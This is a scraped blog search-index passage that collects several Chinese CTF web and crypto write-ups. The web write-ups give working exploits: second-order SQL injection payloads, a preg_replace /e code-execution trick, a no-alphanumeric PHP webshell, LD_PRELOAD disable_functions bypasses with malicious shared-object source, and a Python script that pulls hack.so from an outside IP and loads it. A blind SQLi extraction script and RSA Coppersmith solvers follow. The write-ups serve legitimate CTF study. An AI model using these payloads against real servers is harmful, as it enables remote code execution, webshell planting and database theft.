permission.\u0026#39;);history.go(-1);\u0026lt;/script\u0026gt;\u0026#34;); } } 这里存在一处二次注入, 将原来的文章选出来后将他的title不经过addslashes直接拼接进了update语句中.\nupdate users set isvip=1 where username=\u0026#39;ch3n9w\u0026#39; \u0026#39;;set @a=0x757064617465207573657273207365742069737669703d3120776865726520757365726e616d653d2763683473657227;prepare kk from @a;execute kk;\u0026#39; 这样我就是vip了, 可以使用replace功能了, 这个在源码中其实就是preg_replace.\n$content = addslashes(preg_replace(\u0026#34;/\u0026#34; . $_POST[\u0026#39;find\u0026#39;] . \u0026#34;/\u0026#34;, $_POST[\u0026#39;replace\u0026#39;], $row[\u0026#39;content\u0026#39;])); 传入参数\nfind=/e%00 replace=phpinfo(); 就执行成功了, 写一个shell进去先. 然后发现system类函数都被禁用了, 而且还有basedir限制, 在init_set被禁止的情况下, 可以使用glob协议\nif ($dh = opendir(\u0026#34;glob:///*\u0026#34;)) {while (($file = readdir($dh)) !== false) {echo \u0026#34;$file\\n\u0026#34;;}closedir($dh);} 发现根目录有/readflag和/flag, 接下来使用LD_PRELOAD来绕过disable_function的限制, 在disable_function中看到mail函数都被禁用了, 而且没有安装imagemagick , 可以考虑使用error_log来触发, 问题是这题目在buuoj经过了魔改, /readflag不会直接给出flag而是给出了一道计算题, 回答正确之后才会给出flag, 寻找一个perl脚本来执行, 这是*ctf的一道题目的perl脚本\nuse strict; use IPC::Open3; my $pid = open3( \\*CHLD_IN, \\*CHLD_OUT, \\*CHLD_ERR, \u0026#39;/readflag\u0026#39; ) or die \u0026#34;open3() failed $!\u0026#34;; my $r; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; $r = eval \u0026#34;$r\u0026#34;; print \u0026#34;$r\\n\u0026#34;; print CHLD_IN \u0026#34;$r\\n\u0026#34;; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; 写入之后, 由hack.c编译一个hack.so, hack.c内容如下:\n#define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;signal.h\u0026gt; void pwn(void) { system(\u0026#34;perl /var/www/html/exp.perl \u0026gt; /var/www/html/res 2\u0026gt;\u0026amp;1\u0026#34;); } void getpid(){ unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); pwn(); } 最后执行\nputenv(\u0026#34;LD_PRELOAD=/var/www/html/payload.so\u0026#34;);error_log(\u0026#34;\u0026#34;,1,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;); 就可以拿到flag了\n极客大挑战 RCEme \u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;code\u0026#39;])){ $code=$_GET[\u0026#39;code\u0026#39;]; if(strlen($code)\u0026gt;40){ die(\u0026#34;This is too Long.\u0026#34;); } if(preg_match(\u0026#34;/[A-Za-z0-9]+/\u0026#34;,$code)){ die(\u0026#34;NO.\u0026#34;); } @eval($code); } else{ highlight_file(__FILE__); } // ?\u0026gt; 首先是个无字母数字shell\nhttp://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_=\u0026#34;`{{{\u0026#34;^\u0026#34;?\u0026lt;\u0026gt;/\u0026#34;;${$_}[_](${$_}[__]);\u0026amp;_=assert\u0026amp;__=phpinfo() 很遗憾的发现system等函数都不能执行.\n上蚁剑,但是很奇怪的不能直接用密码__来连接, 要这样连, 不然会有奇怪的东西显示\nhttp://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_=\u0026#34;`{{{\u0026#34;^\u0026#34;?\u0026lt;\u0026gt;/\u0026#34;;${$_}[_](${$_}[__]);\u0026amp;_=assert\u0026amp;__=eval($_POST[a]) \u0026hellip;\u0026hellip;原来一定要eval么\u0026hellip;..\n然后发现根目录下有无读权限的flag和一个readflag二进制文件.\n连上之后向/tmp目录下面写两个东西, 一个是本地生成的so文件,\nhack.c\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; __attribute__ ((__constructor__)) void angel (void){ unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); system(\u0026#34;/readflag \u0026gt; /tmp/ch3n9w\u0026#34;); } 编译\ngcc -shared -fPIC hack.c -o hack.so 拖上去就行了\nch3n9w.php\n\u0026lt;?php putenv(\u0026#34;LD_PRELOAD=/tmp/hack.so\u0026#34;); mail(\u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;); ?\u0026gt; 最后包含代码去执行\nhttp://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_=\u0026#34;`{{{\u0026#34;^\u0026#34;?\u0026lt;\u0026gt;/\u0026#34;;${$_}[_](${$_}[__]);\u0026amp;_=assert\u0026amp;__=include(\u0026#34;/tmp/ch3n9w.php\u0026#34;) mail函数产生进程的同时就会触发preload中的代码, 然后读输出中的flag就行了\n0ctf Wallbreaker Easy 这道题目参考了小西师傅、一叶飘零和郭dalao学长的分享,真实地感觉自己的菜了。。。\n在写脚本的过程中遇见了很多诡异的问题，先留着琢磨。\n主要思路 利用Imagick()中会触发php解释器向外开启系统进程的方法，这里的思路是当传入MPEG格式类型的文件时候，为了转换格式会向外部环境请求并触发ffmpeg的调用，从而开启新的进程。在开启时，环境变量LD_PRELOAD会首先加载，而我们事先会将我们的恶意共享文件hack.so在这个环境变量中指出来，即LD_PRELOAD={DIR}/hack.so。hack.so共享文件由hack.c文件编译，其中调用了__attribute__((constructor))，该方法会在共享文件被加载的时候率先被执行，至于执行的代码，当然就是/readflag \u0026gt; {dir}/flag啦。主要代码如下，代码写法借鉴了郭大佬的脚本，虽然思路不一样，个人感觉dalao的思路更加直接明了。\n脚本\nimport requests import base64 url = \u0026#34;http://111.186.63.208:31340/\u0026#34; dir = \u0026#34;/tmp/ef757c06e983a137384378f47607abfa\u0026#34; #the first time i do this ,i use format function \u0026#39;format\u0026#39; to replace $dir but failed,then i used $dir and \u0026#39;%\u0026#39;,worked ,after the flag went out ,the format problem seems to dispeare? #the new Imagick(\u0026#39;{filename}\u0026#39;) beginning with no work,but didnot after replace\u0026#39;\u0026#39;\u0026#39;to \u0026#39;\u0026#34;\u0026#39;,also disapeared after sovled it cmd = \u0026#39;\u0026#39;\u0026#39; \u0026lt;pre\u0026gt;hello???????\u0026lt;br\u0026gt;\u0026lt;?php echo \u0026#39;hello\u0026#39;;?\u0026gt;\u0026lt;br\u0026gt; \u0026lt;?php $dir = \u0026#34;{0}\u0026#34;; file_put_contents(\u0026#34;{0}/hack.so\u0026#34;,file_get_contents(\u0026#34;http://207.148.64.125:80/hack.so\u0026#34;)); chmod(\u0026#34;{0}/hack.so\u0026#34;,0777); putenv(\u0026#34;LD_PRELOAD={0}/hack.so\u0026#34;); file_put_contents(\u0026#34;{0}/ch3n9w.wmv\u0026#34;,\u0026#34;sssss\u0026#34;); file_put_contents(\u0026#34;{0}/ch3n9w\u0026#34;,\u0026#34;\u0026#34;); $tocken = new Imagick(\u0026#39;{0}/ch3n9w.wmv\u0026#39;); ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026#39;\u0026#39;\u0026#39;.format(dir) #why the command line been executed can not be more than 2 in my script?cause the include will cause error payload = \u0026#39;\u0026#39;\u0026#39; file_put_contents(\u0026#39;%s/evil\u0026#39;,base64_decode(\u0026#34;%s\u0026#34;)); include \u0026#34;%s/evil\u0026#34;; \u0026#39;\u0026#39;\u0026#39;%(dir,base64.b64encode(cmd),dir) print(requests.post(url, data={\u0026#39;backdoor\u0026#39;: payload }).content) print requests.post(url,data={\u0026#39;backdoor\u0026#39;:\u0026#34;print_r(scandir(\u0026#39;%s\u0026#39;));\u0026#34;%dir}).content print requests.post(url,data={\u0026#39;backdoor\u0026#39;:\u0026#34;echo file_get_contents(\u0026#39;%s/ch3n9w\u0026#39;);\u0026#34;%dir}).content 脚本写得很烂，注释部分可以忽略，是我在写的过程中遇到的小问题。\n然后服务器上面的hack.c文件如下：\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; __attribute__ ((__constructor__)) void angel (void){ system(\u0026#34;/readflag \u0026gt; /tmp/ch3n9w\u0026#34;); } 使用命令gcc --share -fPIC hack.c -o hack.so命令来编译共享文件。在服务器目录下面开启python -m SimpleHTTPServer 80，并运行上述python脚本，即可看到flag。\nps:每个人的目录会不定时被服务器清空\n如果LD_PRELOAD不行可以考虑上通杀马\nhttps://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php\n","permalink":"https://ch3n9w.github.io/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/","summary":"\u003cp\u003e贴几个参考链接\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.cnblogs.com/wfzWebSecuity/p/11213732.html\"\u003ehttps://www.cnblogs.com/wfzWebSecuity/p/11213732.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\"\u003ehttps://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\u003c/a\u003e\u003c/p\u003e","title":"LD_PRELOAD劫持类型题目"},{"content":"强网杯 2019 copperstudy 拖拖拉拉终于把这题复现了\u0026hellip;\n开局计算哈希, 爆破爆破\nfrom Crypto.Util.number import * import hashlib from pwn import * import gmpy2 r = remote(\u0026#39;node3.buuoj.cn\u0026#39;, 26182) r.recvuntil(\u0026#34;hexdigest()=\u0026#34;) digest = r.recvline() r.recvuntil(\u0026#34;\u0026#39;hex\u0026#39;)=\u0026#34;) skr5 = r.recvline()[:-1] def proof(skr5, digest): for i in range(64*256*256, 256*256*256): result = hashlib.sha256(skr5.decode(\u0026#39;hex\u0026#39;) + long_to_bytes(i)).hexdigest() if result == digest: print(\u0026#34;found it!\u0026#34;) return ((skr5.decode(\u0026#39;hex\u0026#39;)+long_to_bytes(i)).encode(\u0026#39;hex\u0026#39;)) skr = proof(skr5, digest) r.recvuntil(\u0026#34;encode(\u0026#39;hex\u0026#39;)=\u0026#34;) r.sendline(skr) r.interactive() challenge1 n e c m的高位 解\nn = 13112061820685643239663831166928327119579425830632458568801544406506769461279590962772340249183569437559394200635526183698604582385769381159563710823689417274479549627596095398621182995891454516953722025068926293512505383125227579169778946631369961753587856344582257683672313230378603324005337788913902434023431887061454368566100747618582590270385918204656156089053519709536001906964008635708510672550219546894006091483520355436091053866312718431318498783637712773878423777467316605865516248176248780637132615807886272029843770186833425792049108187487338237850806203728217374848799250419859646871057096297020670904211 e = 3 c = 15987554724003100295326076036413163634398600947695096857803937998969441763014731720375196104010794555868069024393647966040593258267888463732184495020709457560043050577198988363754703741636088089472488971050324654162166657678376557110492703712286306868843728466224887550827162442026262163340935333721705267432790268517 m_high = 2519188594271759205757864486097605540135407501571078627238849443561219057751843170540261842677239681908736 kbits = 72 PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = (m_high + x)^e - c solv = f.small_roots(X=2^kbits, beta=1)[0] print(\u0026#34;x: %s\u0026#34; % hex(int(solv))) challenge2 n e c p的高位 能在n的因子的整数域中等于0也可以构造方程\nn=12784625729032789592766625203074018101354917751492952685083808825504221816847310910447532133616954262271205877651255598995305639194329607493047941212754523879402744065076183778452640602625242851184095546100200565113016690161053808950384458996881574266573992526357954507491397978278604102524731393059303476350167738237822647246425836482533150025923051544431330502522043833872580483142594571802189321599016725741260254170793393777293145010525686561904427613648184843619301241414264343057368192416551134404100386155751297424616254697041043851852081071306219462991969849123668248321130382231769250865190227630009181759219 e=65537 c=627824086157119245056478875800598959553774250161670787506083253960788230737588761787385686125828765665617567887904228030839535317987589608761534500003128247164233774794784231518212804270056404565710426613938264302998015421153393879729263551292024543756422702956470022959537221269172084619081368498693930550456153543628170306324206266216348386707008661128717431426237486511309767286175518238620230507201952867261283880986868752676549613958785288914989429224582849218395471672295410036858881836363364885164276983237312235831591858044908369376855484127614933545955544787160352042318378588039587911741028067576722790778 p_high128 = 97522826022187678545924975588711975512906538181361325096919121233043973599759518562689050415761485716705615149641768982838255403594331293651224395590747133152128042950062103156564440155088882592644046069208405360324372057140890317518802130081198060093576841538008960560391380395697098964411821716664506908672 pbits = 128 PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = p_high128 + x x0 = f.small_roots(X=2^pbits, beta=0.3)[0] p = p_high128 + int(x0) q = n // p print(\u0026#34;p: %s\u0026#34; % p) print(\u0026#34;q: %s\u0026#34; % q) 然后解出明文即可\nchallenge3 n e c d的低512位 就硬套\ndef partial_p(p0, kbits, n): PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) nbits = 1024 f = 2^kbits*x + p0 f = f.monic() roots = f.small_roots(X=2^(nbits//2-kbits), beta=0.2) if roots: x0 = roots[0] p = gcd(2^kbits*x0 + p0, n) return ZZ(p) def find_p(d0, kbits, e, n): X = var(\u0026#39;X\u0026#39;) for k in xrange(1, e+1): results = solve_mod([e*d0*X - k*X*(n-X+1) + k*n == X], 2^kbits) for x in results: p0 = ZZ(x[0]) p = partial_p(p0, kbits, n) if p: return p if __name__ == \u0026#34;__main__\u0026#34;: n=92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183 e=3 c=56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530 d = 787673996295376297668171075170955852109814939442242049800811601753001897317556022653997651874897208487913321031340711138331360350633965420642045383644955 nbits = n.nbits() kbits = 512 d0 = d \u0026amp; (2^kbits-1) p = find_p(d0, kbits, e, n) print \u0026#34;found p: %d\u0026#34; %p q = n // p print \u0026#34;d: %d\u0026#34; % inverse_mod(e, (p-1)*(q-1)) 解出明文发送\nchallenge4 n1 c1 n2 c2 n3 c3 e=3 常规的广播攻击, 使用中国剩余定理\nimport gmpy2 from Crypto.Util.number import * e=3 n1=78642188663937191491235684351005990853149481644703243255021321296087539054265733392095095639539412823093600710316645130404423641473150336492175402885270861906530337207734106926328737198871118125840680572148601743121884788919989184318198417654263598170932154428514561079675550090698019678767738203477097731989 c1=23419685303892339080979695469481275906709035609088426118328601771163101123641599051556995351678670765521269546319724616458499631461037359417701720430452076029312714313804716888119910334476982840024696320503747736428099717113471541651211596481005191146454458591558743268791485623924245960696651150688621664860 n2=98174485544103863705821086588292917749386955237408645745685476234349659452606822650329076955303471252833860010724515777826660887118742978051231030080666542833950748806944312437614585352818344599399156268450521239843157288915059003487783576003027303399985723834248634230998110618288843582573006048070816520647 c2=72080679612442543693944655041130370753964497034378634203383617624269927191363529233872659451561571441107920350406295389613006330637565645758727103723546610079332161151567096389071050158035757745766399510575237344950873632114050632573903701015749830874081198250578516967517980592506626547273178363503100507676 n3=91638855323231795590642755267985988356764327384001022396221901964430032527111968159623063760057482761918901490239790230176524505469897183382928646349163030620342744192731246392941227433195249399795012672172947919435254998997253131826888070173526892674308708289629739522194864912899817994807268945141349669311 c3=22149989692509889061584875630258740744292355239822482581889060656197919681655781672277545701325284646570773490123892626601106871432216449814891757715588851851459306683123591338089745675044763551335899599807235257516935037356212345033087798267959242561085752109746935300735969972249665700075907145744305255616 assert(gmpy2.gcd(n1, n2)==1) assert(gmpy2.gcd(n1, n3)==1) def chinese_remainder(N, C): all_n = reduce(lambda a,b: a*b, N) result = 0 for i in range(len(C)): ni = all_n // N[i] ni_inv = gmpy2.invert(ni, N[i]) result += ni_inv * C[i] * ni return result % all_n N = [n1, n2, n3] C = [c1, c2, c3] result = chinese_remainder(N, C) all_n = reduce(lambda a,b: a*b, N) # print all_n i = 0 while True: root, exact = gmpy2.iroot(result+i*all_n, 3) if exact: print root exit(0) i+=1 challenge5 c = encrypt(m) x = encrypt(m+1) n e=3 相关消息攻击, 套ctfwiki的公式\nimport gmpy2 p1=1 p2=0 c2 =112992730284209629010217336632593897028023711212853788739137950706145189880318698604512926758021533447981943498594790549326550460216939216988828130624120379925895123186121819609415184887470233938291227816332249857236198616538782622327476603338806349004620909717360739157545735826670038169284252348037995399308 c1 =112992730284209629010217336632593897028023711212853788739137950706145189880318698604512926758021552486915464025361447529153776277710423467951041523831865232164370127602772602643378592695459331174613894578701940837730590029577336924367384969935652616989527416027725713616493815764725131271563545176286794438175 n =113604829563460357756722229849309932731534576966155520277171862442445354404910882358287832757024693652075211204635679309777620586814014894544893424988818766425089667672311645586528776360047956843961901352792631908859388801090108188344342619580661377758180391734771694803991493164412644148805229529911069578061 a = 1 b = p1-p2 def getmessage(a, b, c1, c2, n): b3 = gmpy2.powmod(b, 3, n) part1 = b * (c1 + 2 * c2 - b3) % n part2 = a * (c1 - c2 + 2 * b3) % n part2 = gmpy2.invert(part2, n) return part1 * part2 % n message = getmessage(a, b, c1, c2, n) -p2 print message message = hex(message)[2:] print message challenge6 e c n assert(d\u0026lt;n的0.27次方) 只要d小于n的0.292次方就有Boneh and Durfee attack\nhttps://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage\n改改数据, 跑一下就有了\n整合 from Crypto.Util.number import * import os import hashlib from pwn import * import gmpy2 r = remote(\u0026#39;node3.buuoj.cn\u0026#39;, 26182) r.recvuntil(\u0026#34;hexdigest()=\u0026#34;) digest = r.recvline() r.recvuntil(\u0026#34;\u0026#39;hex\u0026#39;)=\u0026#34;) skr5 = r.recvline()[:-1] def proof(skr5, digest): for i in range(64*256*256, 256*256*256): result = hashlib.sha256(skr5.decode(\u0026#39;hex\u0026#39;) + long_to_bytes(i)).hexdigest() if result == digest: print(\u0026#34;found it!\u0026#34;) return ((skr5.decode(\u0026#39;hex\u0026#39;)+long_to_bytes(i)).encode(\u0026#39;hex\u0026#39;)) skr = proof(skr5, digest) r.recvuntil(\u0026#34;encode(\u0026#39;hex\u0026#39;)=\u0026#34;) r.sendline(skr) # r.interactive() x0 = 0x35343237323432377dL m_high = 2519188594271759205757864486097605540135407501571078627238849443561219057751843170540261842677239681908736 ans1 = long_to_bytes(x0 + m_high).encode(\u0026#39;hex\u0026#39;) r.recvuntil(\u0026#34;encode(\u0026#39;hex\u0026#39;)=\u0026#34;) r.sendline(ans1) p = 97522826022187678545924975588711975512906538181361325096919121233043973599759518562689050415761485716705615149641768982838255403594331293651224395590747133152128042950062103156564440155088882592644046069208405360324372057140890317518802130081198060093576841538008960560661715295741651653499691458486798196487 q = 131093675711613661161476275473445206682597559447006571385482255727609238786596952165801814021602699749876712682307789568113374768689632642728986573211776526473651771104432443501294668372441525987174391472994271054873305324343666279426741897612827889525440428582592216151586138881806196331920758968403508531637 e=65537 c = 627824086157119245056478875800598959553774250161670787506083253960788230737588761787385686125828765665617567887904228030839535317987589608761534500003128247164233774794784231518212804270056404565710426613938264302998015421153393879729263551292024543756422702956470022959537221269172084619081368498693930550456153543628170306324206266216348386707008661128717431426237486511309767286175518238620230507201952867261283880986868752676549613958785288914989429224582849218395471672295410036858881836363364885164276983237312235831591858044908369376855484127614933545955544787160352042318378588039587911741028067576722790778 d = gmpy2.invert(e, (q-1)*(p-1)) m = long_to_bytes(pow(c, d, p*q)).encode(\u0026#39;hex\u0026#39;) r.recvuntil(\u0026#34;encode(\u0026#39;hex\u0026#39;)=\u0026#34;) r.sendline(m) d = 61931015986410954522379841763963945834108214123439860201390512063842165571430799255094107119082046571341221952786658415661511901536119262974324197242727901361853519060099176095718398341546521709753140715090423775413590463159715914497625346364363050316931779727154988269576808476796380941227956316802411370267 n=92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183 c=56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530 m = long_to_bytes(pow(c, d, n)).encode(\u0026#39;hex\u0026#39;) r.recvuntil(\u0026#34;encode(\u0026#39;hex\u0026#39;)=\u0026#34;) r.sendline(m) m = 2519188594271759205757864486234199030368509477419996746572813835802776507456368520243429255706508061522045 m = long_to_bytes(m).encode(\u0026#39;hex\u0026#39;) r.recvuntil(\u0026#34;encode(\u0026#39;hex\u0026#39;)=\u0026#34;) r.sendline(m) m = \u0026#34;464c41477b325e3872736133393863663864663763323636363162623763623635623262396661653235657d\u0026#34; r.recvuntil(\u0026#34;encode(\u0026#39;hex\u0026#39;)=\u0026#34;) r.sendline(m) d = 776765455081795377117377680209510234887230129318575063382634593357724998207571 c=0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL n = 0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L m = long_to_bytes(pow(c,d,n)).encode(\u0026#39;hex\u0026#39;) r.recvuntil(\u0026#34;encode(\u0026#39;hex\u0026#39;)=\u0026#34;) r.sendline(m) r.interactive() ","permalink":"https://ch3n9w.github.io/posts/ctf-qwb-copperstudy-record/","summary":"\u003ch2 id=\"强网杯-2019-copperstudy\"\u003e强网杯 2019 copperstudy\u003c/h2\u003e\n\u003cp\u003e拖拖拉拉终于把这题复现了\u0026hellip;\u003c/p\u003e\n\u003cp\u003e开局计算哈希, 爆破爆破\u003c/p\u003e","title":"copperstudy-record"},{"content":"web online_proxy 特征: 第一次登录后源代码内容有如下:\n换一个X-Forwarded-For 后会发现currentip是根据xff判别的\n那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了\n$result = query(\u0026#34;select current_ip, last_ip from ip_log where uuid = \u0026#39;\u0026#34;.addslashes($uuid).\u0026#34;\u0026#39;\u0026#34;); if(count($result) \u0026gt; 0) { if($ip !== $result[0][\u0026#39;current_ip\u0026#39;]) { $last_ip = $result[0][\u0026#39;current_ip\u0026#39;]; query(\u0026#34;delete from ip_log where uuid=\u0026#39;\u0026#34;.addslashes($uuid).\u0026#34;\u0026#39;\u0026#34;); } else { $last_ip = $result[0][\u0026#39;last_ip\u0026#39;]; } } query(\u0026#34;insert into ip_log values (\u0026#39;\u0026#34;.addslashes($uuid).\u0026#34;\u0026#39;, \u0026#39;\u0026#34;.addslashes($ip).\u0026#34;\u0026#39;, \u0026#39;$last_ip\u0026#39;);\u0026#34;); die(\u0026#34;\\n\u0026lt;!-- Debug Info: \\n Duration: $time s \\n Current Ip: $ip \u0026#34;.($last_ip !== \u0026#34;\u0026#34; ? \u0026#34;\\nLast Ip: \u0026#34;.$last_ip : \u0026#34;\u0026#34;).\u0026#34; --\u0026gt;\u0026#34;); 解法:\n先用1'|1|'1作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成二次注入, 事实上也确实如此, 但这个可能得猜\u0026hellip;\u0026hellip;在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到\n成功执行了.\n搬运赵师傅的脚本学习学习\n#!/usr/bin/env python3 import requests target = \u0026#34;http://localhost:8302/\u0026#34; def execute_sql(sql): print(\u0026#34;[*]请求语句：\u0026#34; + sql) return_result = \u0026#34;\u0026#34; payload = \u0026#34;0\u0026#39;|length((\u0026#34; + sql + \u0026#34;))|\u0026#39;0\u0026#34; session = requests.session() r = session.get(target, headers={\u0026#39;X-Forwarded-For\u0026#39;: payload}) r = session.get(target, headers={\u0026#39;X-Forwarded-For\u0026#39;: \u0026#39;glzjin\u0026#39;}) r = session.get(target, headers={\u0026#39;X-Forwarded-For\u0026#39;: \u0026#39;glzjin\u0026#39;}) start_pos = r.text.find(\u0026#34;Last Ip: \u0026#34;) end_pos = r.text.find(\u0026#34; --\u0026gt;\u0026#34;, start_pos) length = int(r.text[start_pos + 9: end_pos]) print(\u0026#34;[+]长度：\u0026#34; + str(length)) for i in range(1, length + 1, 5): payload = \u0026#34;0\u0026#39;|conv(hex(substr((\u0026#34; + sql + \u0026#34;),\u0026#34; + str(i) + \u0026#34;,5)),16,10)|\u0026#39;0\u0026#34; r = session.get(target, headers={\u0026#39;X-Forwarded-For\u0026#39;: payload}) r = session.get(target, headers={\u0026#39;X-Forwarded-For\u0026#39;: \u0026#39;glzjin\u0026#39;}) r = session.get(target, headers={\u0026#39;X-Forwarded-For\u0026#39;: \u0026#39;glzjin\u0026#39;}) start_pos = r.text.find(\u0026#34;Last Ip: \u0026#34;) end_pos = r.text.find(\u0026#34; --\u0026gt;\u0026#34;, start_pos) result = int(r.text[start_pos + 9: end_pos]) return_result += bytes.fromhex(hex(result)[2:]).decode(\u0026#39;utf-8\u0026#39;) print(\u0026#34;[+]位置 \u0026#34; + str(i) + \u0026#34; 请求五位成功:\u0026#34; + bytes.fromhex(hex(result)[2:]).decode(\u0026#39;utf-8\u0026#39;)) return return_result # 获取数据库 print(\u0026#34;[+]获取成功：\u0026#34; + execute_sql(\u0026#34;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA\u0026#34;)) # 获取数据库表 print(\u0026#34;[+]获取成功：\u0026#34; + execute_sql(\u0026#34;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = \u0026#39;F4l9_D4t4B45e\u0026#39;\u0026#34;)) # 获取数据库表 print(\u0026#34;[+]获取成功：\u0026#34; + execute_sql(\u0026#34;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = \u0026#39;F4l9_D4t4B45e\u0026#39; AND TABLE_NAME = \u0026#39;F4l9_t4b1e\u0026#39; \u0026#34;)) # 获取表中内容 print(\u0026#34;[+]获取成功：\u0026#34; + execute_sql(\u0026#34;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e\u0026#34;)) 5555555\n在addslashes后插入数据在数据库中是这样的\n第二行是提取出来不经过addslashes重新插入的结果\neasy_calc https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\nhexdec(bin2hex(\u0026#39;/\u0026#39;)); ?+num=scandir(hex2bin(dechex(47))) #解码出来的会自动带上引号 hexdec(bin2hex(\u0026#39;/f1agg\u0026#39;)); ?+num=file_get_contents(hex2bin(dechex(52115961636711))) 源码是这么执行语句的\n$str = $_GET[\u0026#39;num\u0026#39;]; $blacklist = [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\\[\u0026#39;, \u0026#39;\\]\u0026#39;,\u0026#39;\\$\u0026#39;,\u0026#39;\\\\\u0026#39;,\u0026#39;\\^\u0026#39;]; foreach ($blacklist as $blackitem) { if (preg_match(\u0026#39;/\u0026#39; . $blackitem . \u0026#39;/m\u0026#39;, $str)) { die(\u0026#34;what are you want to do?\u0026#34;); } } eval(\u0026#39;echo \u0026#39;.$str.\u0026#39;;\u0026#39;); Simple UPload \u0026lt;?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index() { show_source(__FILE__); } public function upload() { $uploadFile = $_FILES[\u0026#39;file\u0026#39;] ; if (strstr(strtolower($uploadFile[\u0026#39;name\u0026#39;]), \u0026#34;.php\u0026#34;) ) { return false; } $upload = new \\Think\\Upload();// 实例化上传类 $upload-\u0026gt;maxSize = 4096 ;// 设置附件上传大小 $upload-\u0026gt;allowExts = array(\u0026#39;jpg\u0026#39;, \u0026#39;gif\u0026#39;, \u0026#39;png\u0026#39;, \u0026#39;jpeg\u0026#39;);// 设置附件上传类型 $upload-\u0026gt;rootPath = \u0026#39;./Public/Uploads/\u0026#39;;// 设置附件上传目录 $upload-\u0026gt;savePath = \u0026#39;\u0026#39;;// 设置附件上传子目录 $info = $upload-\u0026gt;upload() ; if(!$info) {// 上传错误提示错误信息 $this-\u0026gt;error($upload-\u0026gt;getError()); return; }else{// 上传成功 获取上传文件信息 $url = __ROOT__.substr($upload-\u0026gt;rootPath,1).$info[\u0026#39;file\u0026#39;][\u0026#39;savepath\u0026#39;].$info[\u0026#39;file\u0026#39;][\u0026#39;savename\u0026#39;] ; echo json_encode(array(\u0026#34;url\u0026#34;=\u0026gt;$url,\u0026#34;success\u0026#34;=\u0026gt;1)); } } } 思路: 